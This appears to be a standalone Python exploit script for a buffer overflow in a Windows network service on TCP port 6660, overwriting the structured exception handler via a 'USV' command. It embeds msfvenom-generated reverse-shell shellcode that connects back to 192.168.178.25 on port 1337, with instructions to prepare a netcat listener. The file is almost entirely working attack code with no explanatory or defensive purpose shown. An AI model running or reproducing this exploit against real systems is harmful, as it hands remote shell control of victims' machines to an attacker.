#!/usr/bin/python
import sys, socket
import struct, sys, time
 
# Target
target = sys.argv[1]
port = 6660

# Junk 
payload = "A"*962

# Next SEH (nSEH) overwriting w/ jmp 0x08 + nops
payload += "\xeb\x08\x90\x90"

# Overwrite SEH with a POP 2 RET 
# Message=  0x0f9e27cf : pop ecx # pop ecx # ret 0x04 |  {PAGE_EXECUTE_READ} [expsrv.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v6.0.9589 (C:\WINDOWS\system32\expsrv.dll)
payload += struct.pack("<I", 0x0f9e27cf)
payload += "\x90"*15 

# Shellcode:
# 	msfvenom  -p windows/shell_reverse_tcp LPORT=1337 LHOST=192.168.178.25 -b "\x0a\x0d\x20\x25" -f c
# 	Payload size: 351 bytes
# 		-> prepare your nc -vv -l p 1337 listener
payload +=("\xbb\xf7\x4f\x86\x94\xda\xca\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x83\xee\xfc\x31\x5e\x0e\x03\xa9\x41\x64\x61\xa9\xb6\xea"
"\x8a\x51\x47\x8b\x03\xb4\x76\x8b\x70\xbd\x29\x3b\xf2\x93\xc5"
"\xb0\x56\x07\x5d\xb4\x7e\x28\xd6\x73\x59\x07\xe7\x28\x99\x06"
"\x6b\x33\xce\xe8\x52\xfc\x03\xe9\x93\xe1\xee\xbb\x4c\x6d\x5c"
"\x2b\xf8\x3b\x5d\xc0\xb2\xaa\xe5\x35\x02\xcc\xc4\xe8\x18\x97"
"\xc6\x0b\xcc\xa3\x4e\x13\x11\x89\x19\xa8\xe1\x65\x98\x78\x38"
"\x85\x37\x45\xf4\x74\x49\x82\x33\x67\x3c\xfa\x47\x1a\x47\x39"
"\x35\xc0\xc2\xd9\x9d\x83\x75\x05\x1f\x47\xe3\xce\x13\x2c\x67"
"\x88\x37\xb3\xa4\xa3\x4c\x38\x4b\x63\xc5\x7a\x68\xa7\x8d\xd9"
"\x11\xfe\x6b\x8f\x2e\xe0\xd3\x70\x8b\x6b\xf9\x65\xa6\x36\x96"
"\x4a\x8b\xc8\x66\xc5\x9c\xbb\x54\x4a\x37\x53\xd5\x03\x91\xa4"
"\x1a\x3e\x65\x3a\xe5\xc1\x96\x13\x22\x95\xc6\x0b\x83\x96\x8c"
"\xcb\x2c\x43\x02\x9b\x82\x3c\xe3\x4b\x63\xed\x8b\x81\x6c\xd2"
"\xac\xaa\xa6\x7b\x46\x51\x21\x44\x3f\xeb\xa8\x2c\x42\x0b\xce"
"\x95\xcb\xed\xba\xf5\x9d\xa6\x52\x6f\x84\x3c\xc2\x70\x12\x39"
"\xc4\xfb\x91\xbe\x8b\x0b\xdf\xac\x7c\xfc\xaa\x8e\x2b\x03\x01"
"\xa6\xb0\x96\xce\x36\xbe\x8a\x58\x61\x97\x7d\x91\xe7\x05\x27"
"\x0b\x15\xd4\xb1\x74\x9d\x03\x02\x7a\x1c\xc1\x3e\x58\x0e\x1f"
"\xbe\xe4\x7a\xcf\xe9\xb2\xd4\xa9\x43\x75\x8e\x63\x3f\xdf\x46"
"\xf5\x73\xe0\x10\xfa\x59\x96\xfc\x4b\x34\xef\x03\x63\xd0\xe7"
"\x7c\x99\x40\x07\x57\x19\x70\x42\xf5\x08\x19\x0b\x6c\x09\x44"
"\xac\x5b\x4e\x71\x2f\x69\x2f\x86\x2f\x18\x2a\xc2\xf7\xf1\x46"
"\x5b\x92\xf5\xf5\x5c\xb7")
payload += "B"*1164 

# Make a connection to target system on TCP/6660
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((target,port))
s.send('USV ' + payload + '\r\n\r\n')
s.close()
